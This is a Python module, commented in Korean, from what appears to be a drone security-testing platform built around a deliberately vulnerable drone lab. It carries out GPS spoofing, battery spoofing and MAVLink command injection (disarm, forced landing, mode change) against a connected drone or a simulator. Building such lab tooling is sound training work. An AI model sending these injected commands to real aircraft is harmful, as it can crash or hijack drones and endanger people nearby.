# DVD 통합 관리자
# core/dvd_integration/manager.py

class DVDIntegrationManager:
    """DVD 통합 관리자"""
    
    def __init__(self, config: Dict[str, Any], event_bus):
        self.config = config
        self.event_bus = event_bus
        self.logger = logging.getLogger(__name__)
        
        # DVD 커넥터
        self.real_connector = DVDRealConnector(config.get('connection', {}))
        self.attack_simulator = DVDAttackSimulator(config, event_bus)
        
        # 실제 연결 가능 여부
        self.real_connection_available = False
        
    async def initialize(self) -> bool:
        """DVD 통합 시스템 초기화"""
        self.logger.info("DVD 통합 시스템 초기화 중...")
        
        # 실제 DVD 연결 시도
        if await self.real_connector.connect():
            self.real_connection_available = True
            self.logger.info("✅ 실제 DVD 시스템 연결됨")
            
            # 메시지 콜백 등록
            self.real_connector.register_message_callback('GPS_RAW_INT', self._on_gps_message)
            self.real_connector.register_message_callback('BATTERY_STATUS', self._on_battery_message)
            self.real_connector.register_message_callback('HEARTBEAT', self._on_heartbeat_message)
            
        else:
            self.logger.warning("⚠️ 실제 DVD 연결 실패. 시뮬레이션 모드로 전환")
            self.real_connection_available = False
        
        return True
    
    async def execute_attack(self, attack_config: Dict[str, Any]) -> bool:
        """공격 실행 (실제 또는 시뮬레이션)"""
        attack_type = attack_config.get('type')
        
        if self.real_connection_available:
            # 실제 DVD 시스템에 공격 실행
            self.logger.info(f"실제 DVD 시스템에 {attack_type} 공격 실행")
            return await self._execute_real_attack(attack_config)
        else:
            # 시뮬레이션 모드
            self.logger.info(f"시뮬레이션 모드에서 {attack_type} 공격 실행")
            return await self.attack_simulator.execute_attack_scenario(attack_config)
    
    async def _execute_real_attack(self, attack_config: Dict[str, Any]) -> bool:
        """실제 DVD 시스템에 공격 실행"""
        attack_type = attack_config.get('type')
        
        try:
            if attack_type == 'gps_spoofing':
                coords = attack_config.get('coordinates', {})
                return await self.real_connector.send_gps_spoof(
                    coords.get('latitude', 37.7749),
                    coords.get('longitude', -122.4194),
                    coords.get('altitude', 100.0)
                )
                
            elif attack_type == 'mavlink_injection':
                command_type = attack_config.get('command_type', 'EMERGENCY_LAND')
                
                # 명령 매핑
                command_map = {
                    'EMERGENCY_LAND': (mavutil.mavlink.MAV_CMD_NAV_LAND, [0, 0, 0, 0, 0, 0, 0]),
                    'DISARM': (mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, [0, 0, 0, 0, 0, 0, 0]),
                    'CHANGE_MODE': (mavutil.mavlink.MAV_CMD_DO_SET_MODE, [1, 4, 0, 0, 0, 0, 0])  # AUTO 모드
                }
                
                if command_type in command_map:
                    command, params = command_map[command_type]
                    return await self.real_connector.send_mavlink_command(command, params)
                    
            elif attack_type == 'battery_spoofing':
                fake_level = attack_config.get('fake_battery_level', 5.0)
                return await self.real_connector.send_battery_spoof(fake_level)
                
            else:
                self.logger.warning(f"실제 연결에서 지원되지 않는 공격: {attack_type}")
                # 시뮬레이션으로 대체
                return await self.attack_simulator.execute_attack_scenario(attack_config)
                
        except Exception as e:
            self.logger.error(f"실제 공격 실행 실패: {e}")
            return False
    
    async def get_system_status(self) -> Dict[str, Any]:
        """시스템 상태 조회"""
        status = {
            'dvd_connection': {
                'real_connection': self.real_connection_available,
                'simulation_mode': not self.real_connection_available
            }
        }
        
        if self.real_connection_available:
            # 실제 드론 상태 조회
            drone_status = await self.real_connector.get_current_status()
            status['drone_status'] = drone_status
        
        return status
    
    async def _on_gps_message(self, msg):
        """GPS 메시지 수신 콜백"""
        gps_data = {
            'latitude': msg.lat / 1e7,
            'longitude': msg.lon / 1e7,
            'altitude': msg.alt / 1000.0,
            'satellites': msg.satellites_visible,
            'timestamp': datetime.now().isoformat()
        }
        
        await self.event_bus.publish('real_gps_data', gps_data)
    
    async def _on_battery_message(self, msg):
        """배터리 메시지 수신 콜백"""
        battery_data = {
            'percentage': msg.battery_remaining,
            'voltage': msg.voltages[0] / 1000.0 if msg.voltages[0] != 65535 else 0,
            'timestamp': datetime.now().isoformat()
        }
        
        await self.event_bus.publish('real_battery_data', battery_data)
    
    async def _on_heartbeat_message(self, msg):
        """하트비트 메시지 수신 콜백"""
        heartbeat_data = {
            'system_id': msg.get_srcSystem(),
            'component_id': msg.get_srcComponent(),
            'type': msg.type,
            'autopilot': msg.autopilot,
            'base_mode': msg.base_mode,
            'system_status': msg.system_status,
            'timestamp': datetime.now().isoformat()
        }
        
        await self.event_bus.publish('real_heartbeat', heartbeat_data)